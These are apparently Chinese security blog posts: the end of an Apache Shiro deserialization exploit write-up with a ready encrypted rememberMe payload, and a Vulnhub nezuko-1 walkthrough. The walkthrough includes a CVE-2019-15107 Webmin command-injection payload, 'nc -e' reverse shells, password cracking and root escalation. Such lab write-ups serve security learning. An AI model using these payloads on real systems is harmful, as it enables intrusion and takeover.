public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser5.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser5.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>本地运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180126001.png"
                      alt="image-20231017180126001"
                ></p>
<p>成功执行。</p>
<p>然后我们就可以测试在shiro框架上面打这条CC链子</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;ser5.bin&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>还是先固定key加密一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180252466.png"
                      alt="image-20231017180252466"
                ></p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure></div>

<p>然后替换rememberMe的值发包打反序列化漏洞。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180343108.png"
                      alt="image-20231017180343108"
                ></p>
<p>可以看到成功执行了弹出计算器的程序。</p>
<p>到这里我们的CC改装就成功了。</p>
<p>当然这里也可以用hashset进行利用链调用。这里就不写了，和cc6的利用一样。</p>
<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>利用链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017181334967.png"
                      alt="image-20231017181334967"
                ></p>
<p>其实这条利用链就是CC6和CC2与CC3的结合，前半部分是CC6，中间利用的是CC2，最后用到了CC3动态加载字节码。</p>
<p>这条链也就是前面cc链的一个改装解决了tomcat下无法利用shiro原生的<code>commons-collections:3.2.1</code>这个问题。</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>nezuko-1打靶记录</title>
    <url>/2023/10/17/nezuko-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机镜像下载地址：<a class="link"   href="https://www.vulnhub.com/entry/nezuko-1%2C352/" >https://www.vulnhub.com/entry/nezuko-1%2C352/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184036448.png"
                      alt="image-20231017184036448"
                ></p>
<p>然后设置虚拟机名和存储位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184104934.png"
                      alt="image-20231017184104934"
                ></p>
<p>设置网络适配器为nat模式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184143582.png"
                      alt="image-20231017184143582"
                ></p>
<p>然后启动虚拟机就可以了。</p>
<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="发现存活主机"><a href="#发现存活主机" class="headerlink" title="发现存活主机"></a>发现存活主机</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017192724463.png"
                      alt="image-20231017192724463"
                ></p>
<p>我们可以得到目标靶机的ip是192.168.113.130</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.113.130</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193002658.png"
                      alt="image-20231017193002658"
                ></p>
<p>可以看到目标靶机开放了22(ssh)端口和80(web)端口</p>
<h1 id="三、漏洞挖掘与利用"><a href="#三、漏洞挖掘与利用" class="headerlink" title="三、漏洞挖掘与利用"></a>三、漏洞挖掘与利用</h1><p>访问靶机对应的web服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193135097.png"
                      alt="image-20231017193135097"
                ></p>
<p>使用dirsearch扫描靶机的目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193422774.png"
                      alt="image-20231017193422774"
                ></p>
<p>可以看到有一个robots.txt文件和一个sqmple路由</p>
<p>访问robots.txt 文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193514862.png"
                      alt="image-20231017193514862"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">NBUW45BAMZZG63JANZSXU5LLN4QDUIDUNBUXGIDJOMQG433UEB2GQZJAOJUWO2DUEBYG64TUEB2G6IDFNZ2W2ZLSMF2GKIC6O5PA====</span><br></pre></td></tr></table></figure></div>

<p>是一段编码的字符串</p>
<p>进行base32解码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193607479.png"
                      alt="image-20231017193607479"
                ></p>
<p>发现是给了一个提示：告诉我们这不是枚举的正确端口</p>
<p>访问扫描出来的另一个路由</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017194313523.png"
                      alt="image-20231017194313523"
                ></p>
<p>有一个txt文件里面啥也没有</p>
<p>提示告诉我们端口不对，那么说明我们端口扫描不完全</p>
<p>重新扫描端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.130</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017194411843.png"
                      alt="image-20231017194411843"
                ></p>
<p>可以看到还开放了一个13337端口对应也是web服务</p>
<p>访问这个端口的服务</p>
<p>这里注意要使用https访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017211824141.png"
                      alt="image-20231017211824141"
                ></p>
<p>可以看到是一个后台管理登录系统</p>
<p>尝试弱口令爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017212037424.png"
                      alt="image-20231017212037424"
                ></p>
<p>爆破失败，尝试了常见的几个弱口令也没有成功</p>
<p>然后尝试去搜索这个管理系统的历史漏洞</p>
<p>然后搜索到一个CVE-2019-15107是一个远程命令执行漏洞</p>
<p>文章链接：<a class="link"   href="https://blog.csdn.net/qq_24481913/article/details/132043461" >https://blog.csdn.net/qq_24481913/article/details/132043461 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>尝试进行cve漏洞利用</p>
<p>漏洞利用点在password_change.cgi路由</p>
<p>在重置密码这个路由存在一个代码执行漏洞</p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213526944.png"
                      alt="image-20231017213526944"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213638043.png"
                     
                ></p>
<p>尝试反弹shell</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=test|nc -e /bin/bash 192.168.113.129 4321&amp;new1=test2&amp;new2=test2</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213822500.png"
                      alt="image-20231017213822500"
                ></p>
<p>kali开启监听4321端口</p>
<p>反弹成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213854292.png"
                      alt="image-20231017213854292"
                ></p>
<p>进入交互模式</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></div>

<p>进入全交互模式失败</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214242995.png"
                      alt="image-20231017214242995"
                ></p>
<h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214337851.png"
                      alt="image-20231017214337851"
                ></p>
<p>我们现在只是一个普通用户权限，要想拿下这台服务器就要提升权限</p>
<p>提权最常用的就是suid提权</p>
<p>首先就是查找有s权限的命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214529391.png"
                      alt="image-20231017214529391"
                ></p>
<p>没有常见的suid提权使用的命令</p>
<p>那么这种方法就不能使用了</p>
<p>这里尝试读取一下&#x2F;etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214732424.png"
                      alt="image-20231017214732424"
                ></p>
<p>可以看到zenitsu用户的密码以加密的形式存放在这里</p>
<p>使用john进行解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214934759.png"
                      alt="image-20231017214934759"
                ></p>
<p>解开这个用户的密码是meowmeow</p>
<p>尝试切换用户提权</p>
<p>但是想要使用su命令要切换成全交互式shell</p>
<p>我们这里可以先尝试使用ssh连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215222171.png"
                      alt="image-20231017215222171"
                ></p>
<p>但是连接失败，那就只能尝试切换成全交互式shell</p>
<p>查看靶机安装的python版本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">which python python2 python3</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215541184.png"
                      alt="image-20231017215541184"
                ></p>
<p>安装的是python3，这也就是我们刚才用python提升失败的原因</p>
<p>那只用用python3来提升交互模式就行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215626779.png"
                      alt="image-20231017215626779"
                ></p>
<p>使用su切换到zenitsu用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215712295.png"
                      alt="image-20231017215712295"
                ></p>
<p>切换用户成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215928046.png"
                      alt="image-20231017215928046"
                ></p>
<p>但是并不是root权限</p>
<p>然后再&#x2F;home&#x2F;zenitsu&#x2F;to_nezuko下找到一个有root权限的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220034339.png"
                      alt="image-20231017220034339"
                ></p>
<p>那么它可以以root权限运行，那我们可以使用它进行反弹shell</p>
<p>尝试写入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.113.129 4321&quot; &gt; send_message_to_nezuko.sh</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220328524.png"
                      alt="image-20231017220328524"
                ></p>
<p>但是写入失败了</p>
<p>用lsattr命令可以查看隐藏权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220425516.png"
                      alt="image-20231017220425516"
                ></p>
<p>chattr +a file使file文件只能追加内容，不能删除、重命名，因此可以直接追加内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220518719.png"
                      alt="image-20231017220518719"
                ></p>
<p>查看文件内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220542396.png"
                      alt="image-20231017220542396"
                ></p>
<p>可以看到反弹shell的代码写入成功了</p>
<p>然后运行sh文件反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017221042296.png"
                      alt="image-20231017221042296"
                ></p>
<p>kali开启监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017221121610.png"
                      alt="image-20231017221121610"
                ></p>
<p>可以看到已经成功拿下这台服务器</p>
]]></content>
      <tags>
        <tag>渗透-靶机-nezuko系列</tag>
      </tags>
  </entry>
</search>
